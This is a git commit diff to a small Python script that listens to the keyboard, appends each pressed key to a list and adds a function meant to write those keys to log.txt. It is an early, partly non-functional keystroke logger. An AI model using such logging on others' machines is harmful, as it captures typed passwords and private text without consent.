d034e2d9bda35cdfe8a9fc053fe2da8055748082
Michael Efemena <mefemena@gmail.com>
2020-09-05 02:34:35 +0100

    append key to global keys variable in on_press function

--- main.py
+++ main.py
@@ -8,15 +8,22 @@ keys = []
 
 def on_press(key):
     global keys, count
+
+    keys.append(key)
+    count += 1
     print("{0} pressed".format(key))
+    
+
 
 def on_release(key):
     if key == Key.esc:
         return False
 
-def write_file():
+def write_file(keys):
     with open('log.txt', 'a') as f:
-        
+        for key in keys:
+            f.write(key)
+
 
 
 with Listener(on_press =on_press, on_release=on_release) as listener:
